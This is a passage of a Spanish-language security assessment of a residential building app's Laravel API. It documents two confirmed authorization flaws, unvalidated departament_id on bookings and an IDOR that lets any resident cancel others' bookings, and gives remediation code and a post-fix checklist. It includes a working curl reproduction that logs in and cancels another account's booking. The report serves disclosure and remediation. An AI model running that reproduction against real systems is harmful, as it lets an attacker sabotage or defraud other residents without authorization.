**Nota sobre cardinalidad (aclarada 2026-07-09, a partir de una pregunta de diseño del usuario):** un usuario puede tener válidamente más de una unidad (ej. `ddiaz` tiene `dpt-304` + `EST-141`; se encontraron residentes reales con hasta 2 departamentos habitables, ej. `fcurahua` con `dpt-105` + `dpt-305`). El **frontend** ya maneja esto correctamente: filtra las unidades a solo tipo "Departamento" (excluye estacionamientos) y, si hay más de una, obliga a elegir con un selector antes de poder reservar (`E.value.length>1 && !departament_id` → bloquea con "Debes seleccionar el departamento"). Si solo hay una, la autoselecciona sin preguntar — por eso una cuenta con 1 depto + 1 cochera nunca ve el selector, no es un bug. El problema real de cardinalidad está exclusivamente en el **backend** (este mismo hallazgo 11): como nunca valida `departament_id` contra las unidades reales del usuario, da igual cuántos departamentos tenga — cualquier valor que mande el cliente se acepta tal cual.
De paso, esto también cierra una puerta relacionada: si el `departament_id` se toma del `$request` en vez de calcularlo del usuario autenticado, alguien podría intentar mandar el `departament_id` de **otro** residente para que la reserva (y su eventual cobro) quede a nombre de otra unidad — vale la pena revisar el controlador para confirmar que no confía en ese campo del body.

**⚠️ Actualización — confirmado (2026-07-09):** se probó exactamente ese escenario con la cuenta `pacifikprueba` (607, sin unidades). El backend **acepta cualquier valor de `departament_id` sin validarlo**, en dos variantes:

1. **Inventado, no existe:** `"departament_id": 999999` → `HTTP 200`, se creó la reserva `id=41` y quedó guardada literalmente con `departament_id: 999999` — un valor que no corresponde a ninguna unidad real. Indica que tampoco hay una restricción de llave foránea (o constraint) a nivel de base de datos protegiendo esta columna.
2. **Real, pero de otro dueño:** `"departament_id": 28` (unidad `dpt-304`, perteneciente a otro usuario, `id=416`) → `HTTP 200`, se creó la reserva `id=42` con `user_id: 607` (quien la creó) pero `departament_id: 28` (de otra persona). Dato mitigante: al revisar `GET /api/bookings` logueado como el dueño real de la unidad 28, la reserva **no aparece en su lista** (esa lista sí filtra correctamente por `user_id`), así que no genera confusión visible inmediata para la víctima — pero el registro queda con una relación `usuario ≠ dueño de la unidad` que podría causar inconsistencias en reportes o facturación que agrupen por departamento en vez de por usuario. Ambas reservas de prueba (41, 42) fueron canceladas tras la prueba.

Esto confirma que el controlador **nunca calcula `departament_id` a partir del usuario autenticado** — simplemente guarda lo que venga en el body, sin existir ni pertenencia. Refuerza que la remediación de arriba (calcular `$departamentId` desde `$user->units()`, ignorando cualquier valor del request) es necesaria, no opcional.

---

## 12. 🔴 IDOR crítico: `POST /api/bookings/cancel/{id}` permite cancelar la reserva de CUALQUIER usuario

**Descripción (confirmado 2026-07-09, prueba cruzada con 2 cuentas reales):** el endpoint que cancela una reserva no verifica que la reserva pertenezca al usuario autenticado. Se probó en las dos direcciones:

- `pacifikprueba` (id 607) canceló una reserva que pertenecía a `vvega` (id 438, reserva `39`) → `200 {"code":200,"data":"ok"}`, quedó en estado `"Cancelada"`.
- `vvega` (id 438) canceló una reserva que pertenecía a `pacifikprueba` (id 607, reserva `40`) → mismo resultado.

**Impacto:** en producción, cualquier residente autenticado puede cancelar sistemáticamente las reservas de áreas comunes de **cualquier otro residente** — piscina, co-working, salón, etc. — incluidas reservas **exclusivas ya pagadas**. Es una vía directa de acoso/sabotaje entre vecinos (denegación de servicio dirigida a personas específicas) y de posible fraude (cancelar la reserva paga de otro justo antes de su horario, dejando el espacio libre para uno mismo).

**Cómo reproducir:**
```bash
# Con dos cuentas reales que tengan cada una al menos una reserva activa
LOGIN_A=$(curl -s -X POST "$BASE/api/login" -H "Content-Type: application/json" -H "Accept: application/json" \
  -d '{"username":"<cuenta_A>","password":"<password_A>"}')
TOKEN_A=$(echo "$LOGIN_A" | grep -oE '"token":"[^"]*"' | cut -d'"' -f4)

# <id_reserva_de_B> = el id de una reserva que pertenece a la cuenta B, no a A
curl -s -X POST "$BASE/api/bookings/cancel/<id_reserva_de_B>" \
  -H "Authorization: Bearer $TOKEN_A" -H "Content-Type: application/json" -H "Accept: application/json" -d '{}' \
  -w "\n[HTTP %{http_code}]\n"
```
- **Vulnerable:** `HTTP 200 {"code":200,"data":"ok"}` y la reserva de B queda cancelada.
- **Correcto:** `HTTP 403`.

**Remediación:**
```php
public function cancel(Request $request, $id)
{
    $booking = Booking::findOrFail($id);
    $user = $request->user();

    if ($booking->user_id != $user->id && !$user->hasRole('admin')) {
        abort(403, 'No tienes permiso para cancelar esta reserva.');
    }

    $booking->update(['status' => 0]);
}
```
Este es el mismo patrón exacto que ya falta en `DELETE /api/users/d/{id}` (hallazgo 5) y `GET /api/bookings/byId/{id}` (hallazgo 9) — los tres controladores de este módulo (`BookingController` y `UserController`) parecen no tener el chequeo de propiedad. Vale la pena que el equipo audite **todos** los métodos de esos dos controladores de una vez, no solo los que probamos aquí.

---

## Checklist de verificación post-fix

- [ ] `APP_DEBUG=false` confirmado (hallazgo 1 ya no reproduce)
- [ ] `storage/logs/laravel.log` devuelve 403/404 (hallazgo 2)
- [ ] Log expuesto rotado y credenciales potencialmente filtradas rotadas
- [ ] `/api/users/byId/{id}` con un ID ajeno devuelve 403 (hallazgo 3)
- [ ] **Urgente, independiente del fix de código:** activar 2FA en la cuenta admin (`id=1`, `username: admin`) — mientras el IDOR siga abierto, es el objetivo más fácil de identificar de todo el sistema
- [ ] Considerar cambiar el username/email públicos de la cuenta admin a algo no adivinable
- [ ] `/api/users/admin/get_pendings` con usuario no-admin devuelve 403 (hallazgo 4)
- [ ] Todas las rutas `admin/*` y rutas con `{id}` revisadas con el mismo patrón
- [x] `PUT /api/users/resident/{id}` con ID ajeno devuelve 403 (hallazgo 5) — ✅ confirmado protegido el 2026-07-08
- [x] `DELETE /api/users/d/{id}` con ID ajeno devuelve 403 (hallazgo 5) — ❌ **confirmado vulnerable el 2026-07-08, pendiente de parchear**
- [x] `POST /api/users/assing_apartmet` valida propiedad/rol (hallazgo 5) — ❌ **confirmado sin chequeo de rol el 2026-07-09** (efecto de negocio no se materializó, pero la petición se procesó sin exigir permisos)
- [x] `POST /api/users/temporary-or-resident` valida propiedad/rol (hallazgo 5) — ✅ confirmado protegido el 2026-07-09 (usa código 500 en vez de 403, revisar eso aparte)
- [x] `POST /api/users/complete-first-time` valida que no acepte `id` ajeno (hallazgo 5) — ✅ confirmado protegido el 2026-07-09 (ignora `id`/`user_id` extra en el body, solo actualiza al usuario autenticado)
- [ ] Confirmar con el negocio si un usuario "familiar" (rol_id=4) debería poder crear más residentes en su unidad, o si eso debe limitarse solo al "Propietario" (matiz encontrado en hallazgo 5)
- [x] Cuenta(s) de prueba usadas para el hallazgo 5 limpiadas/restauradas — ✅ cuentas 608, 610, 611, 612 borradas; password de `pacifikprueba` (607) restaurado a su valor original
- [ ] Cabeceras de seguridad presentes en frontend y backend (hallazgo 6)
- [ ] `/api/bookings/byId/{id}` con reserva ajena devuelve 403 (hallazgo 9)
- [ ] `/api/notices/byId/{id}` ya no incluye el modelo `User` completo del admin ni el array `views` a residentes normales (hallazgo 10)
- [ ] Confirmar `GET /api/quotas` y `GET /api/pays` con una cuenta que sí tenga saldo pendiente, para cerrar ese punto como protegido o vulnerable
- [ ] `POST /api/bookings` rechaza reservas de usuarios sin unidad asignada (hallazgo 11)
- [x] Confirmar que `departament_id` en la reserva se calcula del usuario autenticado y no se toma del body (hallazgo 11) — ❌ **confirmado vulnerable el 2026-07-09**: acepta IDs inventados (999999) e IDs reales de otros usuarios (probado con la unidad 28 de otro dueño) sin validar
- [x] Reservas de prueba (id 37, 38) canceladas — ✅ ambas en estado "Cancelada" el 2026-07-09
- [ ] `POST /api/bookings/cancel/{id}` con reserva ajena devuelve 403 (hallazgo 12) — ❌ **confirmado vulnerable el 2026-07-09** con prueba cruzada entre 2 cuentas reales (reservas 39 y 40, ambas de prueba, quedaron canceladas sin ser el dueño)
- [ ] Auditar todos los métodos de `BookingController` y `UserController` por el mismo patrón de falta de chequeo de propiedad
- [ ] Tokens de prueba usados en esta evaluación revocados en `personal_access_tokens`
- [ ] Re-ejecutar este checklist completo tras cada fix para confirmar que no reaparece
